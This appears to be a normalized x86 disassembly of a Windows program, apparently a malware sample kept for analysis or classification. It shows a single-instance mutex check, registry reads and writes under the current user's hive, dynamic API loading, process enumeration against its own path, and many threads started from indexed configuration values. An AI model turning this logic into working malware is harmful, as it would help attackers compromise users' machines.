inc edi
inc edi
inc eax
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a3e4
add esp 0x10
test al al
je r-xdata
push 0xea60
push eax
call [ WaitForSingleObject@IAT ]
push [ ebp + 0x10 ]
call [ CloseHandle@IAT ]
push r--data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a7eb
push [ ebp + 0x10 ]
call sub_409936
add esp 0x10
mov dl [ edi ]
mov cl dl
cmp dl [ eax ]
jne r-xdata
push 0xe
mov ecx esi
call sub_401289
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
push ebx
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
push r--data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a7eb
add esp 0xc
call sub_408bcb
call sub_401000
push 0x104
push rw-data
push ebx
call [ GetModuleFileNameW@IAT ]
call sub_41123a
push ebx
mov [ rw-data ] al
push r--data
push r--data
lea eax [ ebp - 0x10 ]
push 0x80000002
push eax
call sub_40a43e
add esp 0x14
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ rw-data ] bl
je r-xdata
push 0x1
push r--data
push r--data
jmp r-xdata
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax ebx
cmp [ ebp - 0x14 ] ebx
jne r-xdata
call eax
mov [ rw-data ] eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push 0x27
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
je r-xdata
push 0x2e
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
je r-xdata
push 0xb
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_410fd0
pop ecx
pop ecx
push eax
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x4
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
push 0x5
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
push 0x6
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
push 0x7
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
push 0x8
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
push 0x3
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
je r-xdata
call sub_4091dc
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x14 ] ebx
jne r-xdata
push 0x30
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ wcslen@IAT ]
pop ecx
mov edi eax
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp edi ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov ecx 0x81
xor eax eax
lea edi [ ebp - 0x2ea ]
mov [ ebp - 0x2ec ] bx
[ edi ]
stosw [ edi ]
mov edi rw-data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x2ec ]
push 0x208
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a5ae
add esp 0x1c
lea eax [ ebp - 0x2ec ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
cmp [ rw-data ] bl
mov edi rw-data
je r-xdata
push 0x30
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x9
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_407cfa
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a39b
add esp 0xc
test al al
jne r-xdata
push ebx
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp [ ecx ] eax
jne r-xdata
cmp al 0x1
jne r-xdata
push 0x1
jmp r-xdata
push rw-data
mov ecx edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
push 0x1e
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
mov ecx esi
setne al
push eax
push 0xc
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
mov ecx esi
setne al
push eax
push 0xa
call sub_401289
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x30
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x9
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
call sub_406ea9
add esp 0x14
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
call sub_402be1
call sub_402d04
jmp r-xdata
push 0xf
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov al [ eax ]
lea ecx [ ebp - 0x48 ]
mov [ rw-data ] al
lea eax [ ebp + 0x13 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
push 0x31
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_410fd0
pop ecx
pop ecx
push eax
call [ std::operator==@IAT ]
pop ecx
mov [ ebp + 0x13 ] al
pop ecx
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0x13 ] bl
je r-xdata
push ebx
call sub_41225e
pop ecx
push ebx
push ebx
push ebx
push sub_412030
push ebx
push ebx
call edi
push 0x28
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
mov edi [ CreateThread@IAT ]
cmp al 0x2
pop ecx
mov [ rw-data ] al
jne r-xdata
push 0xd
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410ee4
pop ecx
pop ecx
call sub_408c9e
add esp 0x10
cmp al 0x1
jne r-xdata
mov ecx edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::size@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x10 ] eax
mov ecx edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push [ ebp + 0x10 ]
call [ wcscpy@IAT ]
pop ecx
pop ecx
push 0x3
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::size@IAT ]
lea eax [ eax + eax + 0x2 ]
mov ecx rw-data
push eax
push [ ebp + 0x10 ]
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a788
push [ ebp + 0x10 ]
call sub_412390
add esp 0x24
mov ecx esi
push r--data
push 0xd
call sub_401289
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push 0x31
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x10
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_407cfa
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x11
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_410fd0
pop ecx
pop ecx
push eax
push r--data
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x48 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x38 ]
push 0x11
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x10
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0x48 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
jmp r-xdata
push 0x3
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x48 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx rw-data
call sub_4040b0
dec eax
jne r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x36
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
imul eax eax 0x3e8
cdq
mov [ rw-data ] eax
pop ecx
movsx eax [ rw-data ]
sub eax 0x31
mov [ rw-data ] edx
je r-xdata
pop ebx
jmp r-xdata
push 0x16
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push 0x2
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x10 ] eax
push 0x35
mov ecx esi
mov [ eax ] bl
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
mov eax [ ebp + 0x10 ]
push ebx
push ebx
push eax
push sub_40f42f
setne cl
push ebx
push ebx
mov [ eax + 0x1 ] cl
call edi
push 0x14
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x48 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx rw-data
call sub_404163
jmp r-xdata
push 0x23
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push 0x2
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x10 ] eax
push 0x35
mov ecx esi
mov [ eax ] 0x1
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
mov eax [ ebp + 0x10 ]
push ebx
push ebx
push eax
push sub_40f42f
setne cl
push ebx
push ebx
mov [ eax + 0x1 ] cl
call edi
push 0x2b
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push 0x26
mov ecx esi
mov [ rw-data ] 0x1
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x25
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_407ca7
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
push ebx
push ebx
push sub_401814
push ebx
push ebx
call edi
lea eax [ ebp - 0x38 ]
push eax
call sub_4105c0
pop ecx
push eax
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push 0x2d
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
push 0x2c
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
setne al
push eax
call sub_4069b5
pop ecx
pop ecx
cmp [ rw-data ] bl
je r-xdata
push ebx
call eax
cmp [ rw-data ] bl
je r-xdata
push ebx
push ebx
push ebx
push sub_40970d
push ebx
push ebx
call edi
call sub_40b3f7
push ebx
push ebx
push ebx
push sub_409b60
push ebx
push ebx
call edi
sub_408ae6
push ebp
mov ebp esp
sub esp 0x434
and [ ebp - 0x8 ] 0x0
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
call sub_408f3e
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx ebx [ eax ]
push ebx
call [ malloc@IAT ]
mov edx [ ebp - 0x8 ]
pop ecx
pop ecx
mov edi eax
mov ecx ebx
lea esi [ edx + 0x1 ]
mov edx ecx
mov [ ebp - 0x14 ] eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x9 ]
push ecx
push ebx
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
or eax 0xffffffff
sub eax ebx
add [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
call [ malloc@IAT ]
mov edi eax
mov eax [ ebp - 0x8 ]
pop ecx
mov [ ebp - 0x10 ] edi
mov ecx [ ebp - 0x4 ]
lea esi [ ebx + eax + 0x1 ]
mov eax ecx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
push [ ebp - 0x14 ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x434 ]
call sub_402a90
push [ ebp - 0x4 ]
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x434 ]
push [ ebp - 0x10 ]
push eax
call sub_402b93
push [ ebp - 0x10 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
sub_408bcb
push ebx
mov ebx [ LoadLibraryA@IAT ]
push esi
push edi
push r--data
push r--data
call ebx
mov esi [ GetProcAddress@IAT ]
push eax
call esi
mov edi [ GetModuleHandleA@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push r--data
push r--data
call ebx
push eax
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] eax
jne r-xdata
push r--data
push r--data
call edi
push eax
call esi
mov [ rw-data ] eax
push r--data
push r--data
call ebx
push eax
call esi
mov ebx r--data
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push r--data
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
retn
push r--data
push r--data
call edi
push eax
call esi
mov [ rw-data ] eax
sub_408c9e
push ebp
mov ebp esp
sub esp 0x46c
push ebx
push esi
push edi
lea eax [ ebp - 0x46c ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
mov esi [ std::operator==@IAT ]
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
mov ebx [ CloseHandle@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_410645
pop ecx
push eax
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
call sub_41123a
test al al
je r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x264 ]
push eax
mov [ ebp - 0x264 ] 0x22c
push [ ebp - 0x8 ]
call Process32FirstW
lea eax [ ebp - 0x264 ]
push eax
push [ ebp - 0x8 ]
call Process32NextW
mov edi r--data
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x46c ]
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov esi r--data
push 0x0
push esi
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
mov edi eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp edi [ eax ]
je r-xdata
push [ ebp - 0x8 ]
call ebx
lea eax [ ebp - 0x18 ]
push edi
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403f7f
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ std::operator==@IAT ]
add esp 0x18
test al al
jne r-xdata
push r--data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
push 0x0
mov esi eax
call [ GetModuleHandleA@IAT ]
push eax
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_40e778
pop ecx
test al al
pop ecx
je r-xdata
jmp r-xdata
push r--data
push esi
call [ wcslen@IAT ]
pop ecx
push eax
push edi
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::replace@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ ebp - 0x25c ]
lea eax [ ebp - 0x38 ]
push eax
call sub_411299
pop ecx
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x46c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x264 ]
push eax
push [ ebp - 0x8 ]
call Process32NextW
jmp r-xdata
push esi
call ebx
push 0x1
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a6fe
add esp 0x10
mov bl 0x1
jmp r-xdata
xor bl bl
lea eax [ ebp - 0x18 ]
push edi
push eax
call esi
pop ecx
test al al
pop ecx
jne r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
